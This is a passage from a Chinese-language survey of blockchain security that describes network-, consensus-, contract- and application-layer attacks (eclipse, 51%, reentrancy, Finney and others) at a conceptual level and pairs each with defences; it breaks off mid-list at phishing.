网络层攻击的主要攻击目标是区块链底层的P2P网络，其共性在于攻击者都是通过扰乱用户的之间的通信，从而达到不同的攻击目的。根据攻击方式的特性，区块链网络层攻击大致可以分为信息窃取类攻击、网络路由劫持类攻击和恶意资源占用类攻击。\n\n\n（1）信息窃取类攻击：主要包括客户端代码漏洞和窃听攻击。在针对客户端代码漏洞的攻击场景中，攻击者利用的漏洞可能是预先恶意植入的后门，也可能是开发人员编写错误导致的。理论上，无法完全杜绝类似的漏洞，所以开发商应在软件安全开发生命周期内，通过Fuzzing、代码审计、逆向漏洞分析、反逆向工程等技术对客户端的安全性进行评估，以缓解类似漏洞带给用户的安全威胁。\n  在窃听攻击场景中，攻击者可以通过网络监听等手段获取用户身份、地址等隐私信息，其关键在于用户的区块链网络标识唯一，攻击者可以将窃听得到的IP地址与已有的客户端入口节点进行匹配，从而获得交易数据来源和用户隐私。为了预防窃听攻击，用户应采用混淆的交易方法来打破交易过程中用户唯一标识与IP地址之间的一一对应关系。具体地，多个用户可以通过共享唯一网络标识，实现“一对多”或“多对一”的交易，以此混淆用户唯一标识与IP地址之间的一一对应关系，使得攻击者无法通过匹配用户标识和IP地址来获取用户隐私。此外，在交易数据的传输过程中，应使用可靠的加密算法实现数据的加密传输，防止恶意攻击者对网络节点的信息进行窃取。\n（2）网络路由劫持类攻击：主要包括日蚀攻击、BGP劫持攻击和分割攻击，它们的攻击原理相似，攻击目标分别为单个节点、节点集合和P2P网络。攻击者通过改变节点的网络视图，将目标节点集合从区块链网络中隔离出来，从而达成控制区块链网络的目的。以比特币系统为例，攻击者可以通过这3种攻击迫使部分矿工节点“离线”，导致区块链全网实际算力的流失，从而使攻击者的算力在全网总算力中的占比不断上升。当算力超过全网算力的一半时，攻击者可以以远低于原全网51%的算力发动51%攻击。与通过提升自身算力来实施51%攻击的方式相比，通过日蚀攻击和BGP劫持攻击来提升自身攻击优势的方式更加经济。攻击者之所以可以发起日蚀攻击，其关键在于目标节点无法判断已连接节点的身份。为了预防日蚀攻击，Letz等人提出了共识信誉机制BlockQuick。BlockQuick中的网络节点在接受新产生的区块时，会对矿工的加密签名进行验证，并将该矿工的身份与共识信誉表中已知矿工的身份进行比对。最终，当共识得分大于50%时，网络节点才会接受该区块；否则，节点察觉出攻击者的日蚀攻击行为并拒绝该区块。而在BGP劫持攻击和分割攻击场景中，攻击者主要通过BGP路由劫持实现网络视图分割。针对这个问题，研究人员提出了自动实时检测与缓解系统（ARTEMIS），可以在几分钟内帮助服务提供商解决BGP劫持问题，使得实时流的公共BGP监控服务成为可能。\n（3）恶意资源占用类攻击：DoS，DDoS攻击属于通过恶意资源占用实现的拒绝服务攻击，目前已经存在很多有效的防御工具，如DoS防火墙等。而BDoS和交易延迟攻击则属于社会工程学类攻击，解决此类攻击只能通过不断完善激励制度和奖惩制度、优化网络环境等社会工程学手段。\n共识层攻击类型分析与防御   针对非授权共识机制的攻击。 非授权共识机制是指在非授权网络（公有链）中，节点无需身份认证，即可加入网络与其他节点为达成某种共识而共同运行的特定共识算法。经典非授权共识算法包括工作量证明机制（proof of work，简称PoW）、权益证明机制（proof of stake，简称PoS）、信誉证明机制（proof of reputation，简称PoR）及其衍生算法。委托权益证明机制（delegated proof of stake，简称DPoS）、评价证明机制（proof of review，简称PoR）、PoR&#x2F;PoS混合共识机制（PoR&#x2F;PoS-hybrid）等。授权共识算法中，各节点达成共识消耗的是等价的参与权，即节点共识权重相等。而在非授权共识机制中，各节点通过消耗自身持有的“筹码”（PoW中代表算力Work，PoS中代表权益Stake）竞争记账权，进而达成共识，即节点共识权重不相等。 非授权共识机制可以在本轮竞争“总筹码”为N&#x3D;2n+1、恶意节点持有“筹码”不超过n的情况下，确保全网节点达成正确共识（容错率为1&#x2F;2）。\n   恶意筹码获取。在非授权的共识机制中，节点持有的“筹码”越多，则其获得记账权的可能性越大。所以节点可能通过傀儡挖矿、贿赂攻击、币龄累计攻击等方式获取“筹码”，以提高自己获得记账权的成功率。\n （1）傀儡挖矿攻击（puppet attack）：攻击者通过植入木马入侵大量网络节点，部署挖矿程序，盗用被入侵主机的电力、算力等资源挖矿获利。2018年初，上百款《荒野行动》游戏辅助被植入挖矿木马，利用游戏主机显卡的高性能来挖矿获利。同年，攻击者在大量网站的首页植入Coinhive平台的门罗币（Monero）的挖矿代码，通过网页端盗用网络节点资源挖矿获利，导致该网站用户的系统运行变慢。\n （2）币龄累计攻击（coin age accumulation attack）：在基于“POW+POS”混合共识机制的区块链中，节点持有的“筹码”不仅与其算力有关，还与其持有的币龄有关。持币量越多、持币时间越长，则节点持有的币龄越多。因此，节点可以通过币龄累计攻击来获取更多的“筹码”。买入一定数量代币后，持有足够长时间后，就可以获得足够多的币龄用于竞争记账权。\n （3）贿赂攻击（the bribing attack）:攻击者通过“恶意悬赏”，鼓励矿工在攻击者指定的支链上进行挖矿，当支链挖矿投入的“筹码”超过全网总筹码的一半时，攻击者便通过51%攻击实现双花攻击、历史修复攻击、卖空攻击等。在PoW中，贿赂攻击可以看作是一种算力租借方式，被贿赂矿工需要消耗大量算力来挖矿，因此攻击者的攻击成本较高；而在PoS共识机制中，被贿赂节点不需要消耗大量算力，以较低成本便可赚取攻击者的悬赏，因此贿赂攻击所需的成本较低，常见于PoS系统。\n   除了通过增加“筹码”提高筹码占比的方法以外，攻击者还可能通过网络层日蚀攻击、BGP路由劫持、分割攻击等手段迫使大量节点离线，使区块链网络的总算力流失，从而提高自己的记账权竞争筹码占比和记账权竞争的成功率。\n   51%攻击。一旦存在恶意节点持有的“筹码”超过本轮记账权竞争总“筹码”的一半，则其可以以较大的优势获得记账权，并主导区块链达成特定共识，该攻击被称为短程51%攻击 ；也可以利用资源优势计算并生成一条区块链支链，使其长度超过当前主链，并代替成为新的主链，这种攻击被称为长程51%攻击。\n   在实际的区块链网络中，攻击者可能将51%攻击作为一种子攻击，进而实现以下几类攻击。\n （1）双花攻击（double spending attack）:以比特币系统为例，攻击者在完成交易A后，针对A花费的代币伪造交易B，并发动长程51%攻击，将一条包含交易B的支链变成新的主链。如此，攻击者对相同的一组代币实现了“双重花费” 。2016年8月，基于以太坊的数字货币Krypton遭受了名为“51%Crew”的51%攻击，攻击者通过租用Nicehash（算力买卖市场）的算力，导致该区块链损失约21465KR的代币。2018年，比特币黄金社区的一位成员发文称：有人在尝试进行针对交易所的双花攻击，这一攻击造成了千万美元的损失，同时引起了人们对于去中心化和PoW机制的质疑。\n （2）历史修复攻击（history-revision attack）：在区块链网络中，当攻击者无法持续拥有超过竞争本轮记账权总筹码的一半以上筹码时，攻击者和诚实节点的身份可能发生颠倒，并导致多轮51%攻击。 具体地，当攻击者A成功发起51%攻击将他的支链变为主链时，之前的主链变为支链，诚实节点B变为“恶意节点”，A成为“诚实节点”。一旦B获得超过新一轮记账权总筹码的一半时，便可作为“攻击者”发起51%攻击，将他们的“支链”恢复为主链，此时称B发起了历史修复攻击。\n （3）卖空攻击（shot selling attack）：51%攻击会破坏区块链系统，导致其对应的代币贬值。尤其是在PoS共识机制下，“聪明”的矿工一般不会对基于PoS的区块链系统发动51%攻击。因为攻击者成功发起51%攻击，意味着其持有大量代币，而代币贬值将会给攻击者带来巨大的经济损失。但在支持证券信用交易的PoS系统中，攻击者可能通过51%攻击发起卖空攻击来牟取暴利，具体步骤如下：\n①攻击者持有数量为A的代币，这些代币的权益需超过本轮投票总权益的一半以上。\n②攻击者通过证券信用交易或金融借贷等手段获得数量为B的代币，B的数量远大于A。这里的B是攻击者所借的证券，攻击结束后，需返还等额的代币给借贷方，如交易所。\n③攻击者将所借的代币套现，兑换为具备实际价值的经济实体或货币。\n④攻击者使用双花攻击、传统网络攻击等手段恶意影响区块链网络的正常运作，从而使得基于该区块链的数字货币贬值，此处将贬值率记为Δ。攻击者回购数量为B的代币偿还给借款方，最终获利Δ（B-A）。\n （4）自私挖矿攻击（selfish mining attack）：与双花攻击不同，自私挖矿攻击是一种利用短程51%攻击持续性获取记账权，进而赚取奖励的攻击方式，常见于PoW系统中。攻击者通过短程51%攻击，以较大优势比其他节点先挖到“矿”，暂扣区块并赶在其他节点之前公布出来，以获取记账权并赚取奖励。在延迟公布期间，攻击者沿着之前的区块继续挖矿，以积攒更多的优势，保证他可以连续获得奖励 。这种攻击不会破坏比特币的运行机制，但会使其他节点的工作量无效化，浪费了大量的算力。\n其他攻击分析如下：（1）无利害关系攻击（nothing at stake attack）：这是一种针对PoS共识机制的攻击方式，攻击者可以在区块链产生分叉时，使用权益同时为多个分叉出块，以获取最大化的收益。由于攻击者无需像在PoW系统中消耗大量算力，只需进行权益投票便可实现利益最大化，因此也被称为“作恶无成本，好处无限多”的无利害关系问题，这变相地鼓励了区块链分叉的产生。“聪明”的矿工往往采取“在每条分叉上同时挖矿”的最佳策略以获取最大收益，这将导致区块链产生过多分叉，不再是唯一链。全网节点也因此无法达成共识，进而引起双花攻击、非法交易的泛滥。\n（2）预计算攻击（pre-computation attack）：在“PoW+PoS”混合共识机制中，当前区块难度取决于前一区块参数（如哈希值）。攻击者可以在生成区块时，通过随机试错法计算并选择一个对自己产生下一区块最有利的参数。通过这种方式，攻击者有更大的优势可以获得下一区块的奖励。\n （3）长距离攻击（long range attack）：PoS系统中，区块的生成速度比PoW快很多，所以攻击者可能尝试通过重写区块链账本，从而实现代币双花等目的。这种攻击和PoW中的长程51%攻击的原理相似 ，区别在于长距离攻击中，攻击者不用消耗大量算力，便可能伪造出一条新的区块链主链 ，攻击成本更低，所以带来的安全威胁更大。\n   共识层攻击的主要攻击目标是影响区块链的共识进程 ，其共性在于攻击者都是利用共识机制的特点或缺陷来提高自身竞争记账权的成功率，从而使区块链沿着对攻击者有利的方向发展 ，以实现妨碍网络正常运行、货币双花、最大获利等实际目的。其特性则在于各个攻击的场景、目的、方式的不同。授权共识机制中，攻击者持有的有效节点身份数量是影响共识进程的关键。而在非授权共识机制中，算力、权益等类型的资源才是影响共识进程的关键。 同时，攻击者为了获取更多资源，可能采用诸多恶意的筹码获取手段来提升自己竞争记账权的成功率。此外，在一些特殊的系统中，攻击者无需积累“资源”便可实现最大化收益。\n   在授权共识机制中，攻击者需持有超过全网1&#x2F;3的节点才有可能主导区块链网络达成有利于自己的共识即攻击者操纵了多个节点身份，发起了女巫攻击。在女巫攻击的场景中，攻击者可能通过伪造等手段获取多个节点身份，也可能通过胁迫、腐化等手段控制多个节点，而其他节点无法检测、判断出攻击者持有节点身份的数量及其之间的内部关系。因此，阻止女巫攻击的关键在于阻止攻击者获取多重身份，可以考虑以下策略。\n （1）采用节点身份验证机制，通过身份验证防止攻击者伪造节点身份。目前，部分私有链采用了PoA共识机制，如Aura、Clique等，该机制通过随机密钥分发与基于公钥体制的认证方式，使得攻击者无法在区块链网络中伪造多个身份，在一定程度上缓解了女巫攻击。\n （2）采用高成本的多身份申请机制，通过提高身份伪造成本缓解女巫攻击。 尽管节点身份验证机制可以阻止攻击者伪造身份，但在实际中，这种方式无法满足诚实节点对多节点身份的正常需求。因此，可以考虑在区块链中引入首次申请身份免费、多次申请成本指数式升高的身份申请机制，在满足节点对多身份正常需求的同时，指数式增加攻击者的攻击成本，缓解女巫攻击带来的安全威胁。\n 理论上，女巫攻击也可以出现在非授权的共识场景中，但由于非授权共识算法中的节点是通过自身持有的“筹码”竞争记账权，多重身份伪造意味着攻击者“筹码”的分流，但“筹码”总量不会发生变化，而攻击者实施女巫攻击不但不能提高自己获得记账权的成功率，反而有可能导致其成功率降低，所以女巫攻击不会对非授权共识机制的共识过程产生实质性影响。\n   克隆攻击是一种专门针对PoA系统的攻击方式，攻击者成功实施克隆攻击的关键，一方面在于PoA系统中记账节点集合恒定不变的固有缺陷，另一方面在于攻击者是否能通过BGP劫持攻击、分割攻击成功实现网络分区。因此，解决克隆攻击的关键在于如何阻止攻击者成功实施BGP劫持攻击、分割攻击，所以可以考虑采用ARTEMIS系统预防攻击者进行网络分区，从源头阻止克隆攻击。然而，ARTEMIS系统只能在网络发生异常时发现区块链网络是否发生分区，如果攻击者仅对部分关键数据进行管控而不影响其他数据的正常传递，则ARTEMIS也无法阻止此类“无特征”的克隆攻击。此时，准备出块的区块链节点可以考虑引入基于权重的节点活性检测方法，主动检测区块链网络是否发生网络分区。具体地，区块链节点可以通过随机取样的方式选取区块链中已有的区块，根据其中包含的交易类型、金额、数量等特征计算出该区块生成者的权重。然后随机选择节点并请求包含其心跳信息和上一区块哈希值在内的活性证明，如果该节点成功证明自身活性，则验证者累计已验证节点的权重，并重复上述操作直至累计权重达到预先设置的阈值；若被选中节点未通过或未参与活性检测，则证明区块链网络发生分区，应立即停止出块。尽管该方法与ARTEMIS无法从根本上阻止攻击者在PoA系统中实施克隆攻击，但能够在一定程度上预防并缓解克隆攻击来的危害，避免损失。\n   在非授权共识机制中，攻击者在本轮“记账权”竞争中需持有超过全网1&#x2F;2的“筹码”，才有可能通过51%攻击主导区块链网络达成有利于自己的共识，进而实现双花攻击、历史修复攻击、卖空攻击等目的。而实际中，攻击者通常很难自己拥有足够的“筹码”来实施51%攻击，所以可能会通过各种手段获取“筹码”。为了预防51%攻击区块链网络应该采取如下策略，阻止攻击者通过傀儡挖矿攻击、贿赂攻击等方法获取“筹码”。\n（1）加强区块链客户端的入侵检测能力，添加防火墙，阻止攻击者通过木马病毒入侵网络节点，盗用受害节点的挖矿资源。\n（2）采用针对“恶意悬赏”的惩罚机制，缓解贿赂攻击带来的危害。全网节点可以对抵制恶意悬赏、恶意攻击达成共识，缴纳保证金并签订智能合约。一旦出现恶意悬赏，则对举报者进行奖励，对恶意节点进行惩罚，没收悬赏金额和保证金，限制其网络交易权限。\n （3）在PoS中采用新型的币龄计算方法，限制节点恶意累计币龄的行为。如：点点币通过在币龄计算方法中设置节点持币时间上限的方式，限制了用户所持币龄的上限，在一定程度上阻止了51%攻击。\n （4）在PoS中采用币龄预警、清零机制，预防51%攻击。在记账权竞争过程中，对节点进行身份认证和权益关联。若发现单节点或关联节点所持权益超过全网一半，则启动预警机制，阻止共识进程，然后清空恶意节点持有的全部币龄，并处罚金。\n   尽管如此，攻击者还可能存在其他获取“筹码”的途径。为了进一步阻止51%攻击，以太坊提出了一种计划内置于PoS系统客户端的Casper机制。Casper机制要求以太坊的矿工锁定一些以太币作为押金，为刚产生的区块担保。如果投注者是诚实的，他们将获得相应的交易费用作为奖励；否则，Casper将没收大量已投注的以太币作为惩罚。显然，类似Casper机制的保证金奖惩机制可以很好地解决一些社会工程学问题，从而预防趋利节点发起的各种攻击。如：在无利害关系攻击场景中，Casper机制可以惩罚大部分恶意行为，提升了制造恶意分叉的代价使无利害关系攻击无法为攻击者带来收益。若矿工想参与挖矿，则他必须抵押一定数量的以太币作为押金，保证自己在最长链上挖矿。若该区块被确认上链，则矿工收回保证金并获得一定的奖励。如果其他矿工尝试在多条支链上挖矿来进行无利害关系攻击，则会被没收其在多条支链上的押金，这种概念叫做剑手（slasher）协议，即如果矿工在同一个层级的分叉上同时签署了两份承诺，该矿工就会失去区块奖励，甚至被没收押金。\n   在预计算攻击场景中，攻击者可以通过预计算确定下一区块计算难度的关键在于区块生成算法中，上一区块哈希值与下一区块计算难度的关联性 。所以为了预防PoS系统中的预计算攻击，应该重新制定区块生成算法首先，可以考虑打断当前区块链计算难度与前一区块哈希值之间的联系，使得攻击者无法通过预计算控制后续区块的计算难度；其次，也可以考虑增加新的计算元素，使得上一区块的哈希值不再是确定下一区块计算难度的唯一因素。在长距离攻击场景中，区块链网络无法阻止攻击者伪造一条新的区块链主链，但可以通过类似BlockQuick的方式，通过增加身份认证、信誉值对比的方式限制全网节点对该链的接受度来预防长距离攻击。\n合约层攻击类型分析与防御   合约层是区块链2.0技术体系的重要标志，封装了区块链的各类脚本代码、算法机制和智能合约，使区块链技术具备了较高的可编程性和实用性。图灵完备的区块链网络允许用户在区块链网络上开发并部署特定的代码或应用，但智能合约在编写过程中存在的诸多不足，可能给区块链网络带来以下安全隐患。\n（1）整数溢出漏洞（integer overflow and underflow vulnerability）： 智能合约代码中，整数型变量都存在上限或下限，当变量存储的数值超过上限则称为整数上溢，超过下限则称为整数下溢。当一个整数变量发生溢出时，可能会从一个很大的数变成很小的数或者从一个很小的数变成很大的数。利用这个漏洞，攻击者通常通过输入异常参数致使整数溢出，从而达到修改地址指针，实现代码异常调用的目的。2010年8月，由于验证机制中存在大整数溢出漏洞，比特币的第74638块出现了一条包含超过1844亿个比特币的交易。2018年4月，BeautyChain（BEC）智能合约中出现了一个灾难性的整数溢出漏洞，导致约10亿美元的损失。\n（2）时间戳依赖攻击（time-stamp dependency attack）： 智能合约的执行大多依赖于当前区块的时间戳，不同的时间戳可能导致智能合约产生不同的执行结果。以抽奖合约为例:假设智能合约需要根据当前时间戳和其他可提前获知变量计算出一个“幸运数”，以确定获奖人员。攻击者则可以在挖矿过程中提前尝试使用不同的时间戳来计算“幸运数”，从而将奖品送给自己想给的获奖者。\n（3）调用深度攻击（call deep attack）： 合约虚拟机在运行过程中会为合约相互调用的深度设置一个阈值，即使合约调用不存在任何逻辑问题，但当调用深度超过该阈值后，合约将不再往下执行，即合约调用失败 。例如在以太坊虚拟机中，调用深度被限制为1024。如果攻击者发起一系列递归调用让栈的深度到达了1023，之后再调用目标智能合约的关键函数，就会自动导致这个函数所有的子调用失败。因此，攻击者可以通过控制调用深度，使得某些关键操作无法执行 。例如在区块链上实现一个拍卖的智能合约，由于拍卖过程中可能存在多次竞价，需要反复调用合约中的出价函数，攻击者可以恶意刷出价次数。当调用深度达到1023次临界值时竞拍结束，此时调用转账函数就会失败，导致拍卖失败。\n（4）误操作异常攻击（misoperation attack）： 攻击者通过智能合约A调用智能合约B时，B可能因为执行异常而返回合约未执行的状态，若A不检查B的结果而继续执行，则将导致A在B未执行的情况下完成调用。 以KoET智能合约为例:网络中各节点可以通过智能合约买卖“以太币国王”称号来获利，支付金额由现任国王来决定。当一个节点想购买“国王”称号时，智能合约A调用智能合约B支付赔偿金给现任国王，并指定该节点成为新的国王。如果B因为操作异常（如调用深度攻击）导致支付失败，而A在未检查B执行结果的情况下继续执行，将导致节点在未支付赔偿金的情况下成为新的“国王”，原“国王”同时失去国王称号和赔偿金。\n（5）重入攻击（re-entrancy attacks）： 攻击者针对智能合约代码的重入漏洞发起的攻击，可导致两个智能合约发生循环调用。其中最具代表性的是DAO攻击：攻击者通过智能合约A向智能合约B发起提现请求，B向A转账并调用A的回调函数。此时，若A的回调函数中被攻击者写入操作“合约A向合约B发起提现请求”。 如此，A再次向B发起提现请求并重复提现过程，直至提现失败（账户余额不足）。2016年6月发生了一起史上最严重的智能合约安全事件——“The DAO”，导致价值6000万美元的以太币被盗，迫使以太币硬分叉为以太坊ETH和以太经典ETC。\n   针对合约虚拟机的攻击。合约虚拟机是智能合约的调用、执行平台，是区块链技术支持多样化应用的载体，提高了区块链的可扩展性，但仍然可能存在一些安全隐患。\n（1）逃逸漏洞（escape vulnerability）： 攻击者在控制一个虚拟机的前提下，通过利用虚拟机和底层监控器（virtual machine monitor，简称VMM）的交互漏洞，实现对底层VMM或其他虚拟机的控制。虚拟机逃逸后可以在VMM层或者管理域中安装后门、执行拒绝服务攻击、窃取其他用户数据，甚至控制其他用户虚拟机等。在区块链系统中，虚拟机在运行代码时会提供一个沙盒环境，一般用户只能在沙盒的限制中执行相应的代码，此类型漏洞会使得攻击者编写的恶意代码在运行该沙盒环境的宿主机上执行，破坏宿主机与沙盒的隔离性。\n（2）逻辑漏洞（logic vulnerability）：逻辑漏洞是指由于程序逻辑不严谨，导致逻辑分支被非正常处理或错误处理的漏洞。虚拟机在发现代码不符合规范时，可能会做一些“容错处理”，并导致一些逻辑问题。最典型的是“以太坊短地址攻击”[97]:在ERC-20 TOKEN标准[98]下，攻击者可以输入一个短地址并调用Transfer方法提币。EVM虚拟机在解析合约代码时，会通过末尾填充0的方式将短地址补至预期长度。此时，参数编码可能出现逻辑漏洞，导致攻击者获取与交易金额不符的代币。\n（3）资源滥用漏洞（resource-exhaustion vulnerability）：攻击者在虚拟机上部署恶意代码，恶意消耗系统存储资源和计算资源。所以在虚拟机中必须要有相应的限制机制来防止系统的资源被滥用。在以太坊中，智能合约采用了gas机制，攻击者想在以太坊虚拟机上做更多操作，需要付出经济代价。\n   合约层攻击的共性在于，攻击者是尝试通过干扰合约的正常调用来实现不同的攻击目的。其特性在于不同攻击方式的攻击目标和原理不同，攻击者可以利用智能合约的代码漏洞或合约虚拟机的运行漏洞，尝试通过非正常的合约调用，以实现非法获利、破坏区块链网络的目的。\n   智能合约实质上是由开发者编写并部署在区块链上的一段代码，其中的漏洞可能是由于开发人员编写的代码不符合标准导致的，如整数溢出漏洞、时间戳依赖性、调用深度限制等；也可能是攻击者（开发者）恶意植入的，如重入攻击。所以在智能合约编写过程中，开发人员需考虑到以下几方面。\n（1）养成良好的编程习惯，以严谨的编程逻辑避免智能合约开发过程中出现整数溢出等常见的漏洞。\n（2）针对智能合约的时间戳依赖性，在合约开发过程中应采用多维参数输入、随机参数输入等，避免合约执行结果完全依赖于时间戳，降低合约执行结果的可预测性。\n（3）针对智能合约的调用深度限制，应在智能合约中预先设置预警惩罚机制。当合约调用次数接近上限时，智能合约调用预警合约对用户发出提醒，若用户继续调用合约最终导致合约运行失败，则预警合约调用惩罚合约对最后调用合约的用户进行惩罚。\n（4）针对重入漏洞，应在合约开发过程中设置参数检验机制。当智能合约A调用智能合约B时，应对B返回的参数进行确认，再继续执行。参数检验机制可以阻止攻击者通过在B植入漏洞发起重入攻击，也可以阻止攻击者实施误操作异常攻击。\n   尽管良好的编程习惯和编程策略可以在一定程度上避免智能合约中出现安全漏洞，但仍有一些安全漏洞是不可避免的。所以在部署智能合约时，用户可以采用以下方法避免代码漏洞带来的危害。\n （1）安全评估:在正式部署智能合约前，应对其进行大量安全测试或白盒审计，以评估该合约的安全性。\n （2）采用Sereum，ZEUS等重入攻击防护工具。其中，Sereum支持多种重入攻击的识别，不仅适用于待部署合约，还可以保护已部署智能合约在重入攻击下的安全性，误报率仅为0.06%。\n   此外，合约虚拟机中存在的逃逸漏洞、逻辑漏洞、资源滥用漏洞可能会导致智能合约的异常运行，攻击者可以在发现这些漏洞后，在与其他用户订立智能合约时，利用这些漏洞编写有利于自己的智能合约代码，使得智能合约失去公平性。所以，区块链网络在引入智能合约虚拟机时，应对虚拟机进行系统的代码审计，分析评估其安全性，并将其可能存在的安全漏洞披露出来。而用户在部署智能合约时，除了对合约代码进行常规审计外，也要根据目标合约虚拟机披露的漏洞对代码进行审计，做好双向的智能合约运行环境评估。\n应用层攻击类型分析与防御   应用层是区块链技术的应用载体，为各种业务场景提供解决方案。应用层主要有挖矿机制和区块链交易中存在的安全漏洞和恶意攻击。\n   挖矿场景中的攻击 。 “挖矿”是维持PoW系统正常运转的动力，很多攻击者尝试利用挖矿过程中存在的漏洞获利，这会导致严重的资源浪费，进而降低区块链网络的吞吐量。其中，主要包括针对矿机系统和挖矿机制的恶意攻击。\n   针对矿机系统的攻击 。由于系统代码的闭源特性，用户无法检查矿机的安全性，所以存在诸多安全隐患。\n （1） 0day漏洞攻击（zero-day （0day） vulnerability）：目前，大多数矿机的系统都是通用的，一旦某个矿机系统被发现存在0day漏洞，攻击者可以利用该漏洞得到系统控制权限。\n （2）网络渗透攻击（network penetration attack）：攻击者通过利用多种安全漏洞对客户端系统（如钱包客户端、矿机系统、Web服务系统等）进行持续性渗透，最终获取系统的控制权限，威胁矿机的系统安全。该攻击方式不限制于某一特定漏洞，最终以获取系统权限为目的。\n （3）地址篡改攻击（address tampering attack）：攻击者在攻陷矿机系统之后，通过篡改挖矿奖励接收地址的方式，劫持并盗取原属于目标矿工的挖矿奖励。\n资源浪费   在挖矿过程中，“聪明”的矿工可能利用挖矿机制的一些漏洞做出趋利行为，导致严重的资源浪费。主要包括:\n（1）算力伪造攻击（computational forgery attack）：在比特币系统中，矿池一般通过特定的工作量证明检验算法来检验当前矿工的实际算力。如果算法存在某些漏洞时，“聪明”的矿工可能通过虚报算力来获取更高的奖励，这将严重影响奖励分配的公平性，导致矿池的算力流失。\n（2）扣块攻击（block withholding attack）：也被称为藏块攻击。主要有3种形式：第1种是矿池下发计算任务后，恶意矿工直接返回一个错误的计算值，然后分得矿池根据算力分发的数字货币奖励；第2种是矿工挖出区块后，不向矿池返回，而是私自广播至整个网络，独自获得相应的区块奖励；第3种是恶意矿工不会发布自己挖到的区块，导致矿池收益降低。扣块攻击成本较高，恶意矿工获利较少，甚至不获利，所以该攻击常见于矿池恶意竞争的场景中：恶意矿工作为“间谍”加入敌方矿池，在领取敌方矿池奖励的同时，通过浪费敌方矿池的算力资源来获取己方矿池的报酬，实现两方获利。扣块攻击的出现，激化了矿池间的恶意竞争，严重扰乱了正常的挖矿秩序。\n（3）丢弃攻击（drop attack）： 攻击者将多个具有良好网络连接的节点置于网络中，这样不但可以方便地获知最新被广播出的区块，也可以比其他节点更加快速地传播目标区块。当攻击者挖出新区块后不会及时公布，直至得知有区块被公布时，攻击者会立即发布自己的区块，并且利用布置好的节点快速地广播到整个网络，使得该合法节点开采的区块被丢弃，从而获取奖励。\n（4）空块攻击（empty block attack）： 空块攻击是早期比特币网络中常见的攻击方式，攻击者通过生成空块获取比打包交易区块更快的出块速度， 从而以更大的可能性获取出块奖励。空块的产生，意味着比特币网络有10分钟处于拒绝服务的状态 。偶尔出现空块不会对网络产生太大影响，但短期内出现大量空块，会使交易池中的交易大量滞留，平均交易时间延长。\n（5）通用挖矿攻击（general mining attack）：通用挖矿攻击常见于区块链系统初始化建立的阶段，当该系统与某个已成熟区块链系统采用相同的架构和共识机制时，后者系统中具备大量算力的攻击者可能加入新区块链进行挖矿，以恶意竞争出块奖励。此时容易产生算力集中化问题，甚至当攻击者算力超过新系统全网一半时，可能发起51%攻击来实现代币双花、历史修复、卖空攻击等攻击目的。\n（6）交易顺序依赖攻击（transaction-ordering dependence attack）：区块链交易场景中，交易的处理顺序不同，则其产生的结果也不相同。例如：当攻击者发布一个奖励丰富的解题智能合约时，攻击者可以监听网络中与之相关的解题交易，并在目标解题交易被验证、打包上链前，发布一个具备高Gas值的交易，将解题合约的奖励降低为0。出于最大获利的目的，矿工会优先将高Gas值的交易打包上链，导致解题者无法获得智能合约中原先声明的奖励。\n（7）芬尼攻击（Finney attack）： 芬尼攻击是扣块攻击的一种衍生攻击，主要发生在支持零确认交易的服务场景中，可以作为实现双花攻击的跳板。以比特币系统为例，每笔交易被打包后需要经过6个区块的确认才能真正上链，这明显无法满足部分服务场景对即时性交易的需求，所以部分商家推出零确认交易服务，即用户在完成交易后无需等待确认便可获取服务，商家则需等待交易数据上链才可以获得相应的费用。攻击者可以利用零确认交易的缺点，实施芬尼攻击：当攻击者挖到包含自己交易A的区块时扣留该区块，然后就A对应的代币与商家完成零确认交易B，并在B被确认前将包含A的区块广播至全网。此时，交易B被验证为不合法，攻击者由此实现了双花攻击。 与通过51%攻击实现的双花攻击相比，芬尼攻击的攻击成本远低于基于51%攻击的双花攻击，因此相对常见。\n（8）种族攻击（race attack）： 种族攻击可以看作是一种进阶版的芬尼攻击，可以通过扰乱正常的交易顺序来实现双花攻击。与交易顺序依赖攻击不同的是：交易顺序依赖攻击针对的是智能合约，而种族攻击针对的是支持零确认交易的服务场景。如以太坊中，攻击者在与商家完成零确认交易A后，就A对应的代币生成一个高Gas值的交易B，“聪明”的矿工会优先将B打包进区块以获取最大化的利益，导致零确认交易A验证失败，而攻击者已经提前获取了相应服务，实现了代币双花。\n针对交易平台的攻击   随着部分国家对比特币的认可，出现了很多区块链数字货币、交易平台，形成了一套相对完整的区块链电子货币金融体系。用户节点可以通过交易平台进行资产转换、投资等商业行为，也可以通过钱包账户进行点对点的可信交易。多样的交易平台和用户账户中存在的安全漏洞，严重威胁着区块链用户的资产安全。\n   交易平台是区块链电子货币金融体系中十分重要的一类实体，为区块链用户提供了进行各种商业行为的场所。但由于用户的安全意识不足、系统潜在的安全漏洞等原因，交易平台面临隐私泄露、资产流失的风险。\n （1）弱口令攻击（weak password attack）：实际中，用户可能出于方便记忆等原因，为自己的账户设置了安全级别较低的密码，攻击者通过简单的猜测、穷举等方式，即可获取用户的账户访问权限。\n （2）撞库攻击（credential stuffing attack）：用户由于安全意识不足，可能在不同的网站使用相同的账号和口令。攻击者可以通过钓鱼攻击等手段收集与区块链、金融等相关网站上的用户账号和口令，然后在目标交易平台上使用自动化程序逐个尝试，以获取该平台中用户的账户隐私信息。\n （3）穷举攻击（brute-force attack）：如果网站不对登陆接口做请求限制或者风险控制 ，攻击者可以针对目标值发送多次测试请求，尝试通过穷举攻击破解某些关键信息。如在短信验证中，若平台不对短信验证码的有效期或验证接口进行限制， 攻击者可以轻易对其完成破解。若平台对登陆接口未做请求限制 ，攻击者可以通过大量的密码字典来暴力破解某个账户的密码。\n （4） API接口攻击（application programming interface，简称API attack）：用户通常使用私钥key，通过交易平台中私有的API接口来执行一些敏感操作，如交易所新订单的确认、取消等。一旦API key泄露，很可能导致用户账户蒙受经济损失。2018年3月，币安网大量用户API key泄露，攻击者通过泄露的key直接操作用户交易，致一万余枚的比特币被用于购买其他币种，造成币市动荡。\n （5）单点登陆漏洞（single sign-on vulnerability）：攻击者可以通过跨站请求伪造、跨站脚本攻击等手段来窃取用户登陆的Ticket，从而盗取目标用户账户中的资金。2017年10月，OKCoin旗下交易所出现大量账户被盗情况，损失金额超过1千万人民币。\n针对用户账户的攻击   区块链钱包、交易所账户是用户参与区块链交易的重要工具，保管着大量的用户隐私和资产，是攻击者的主要攻击目标。由于服务场景的多样性和复杂性，用户账户主要面临以下安全威胁。\n（1）钓鱼攻击（phishing attack）： 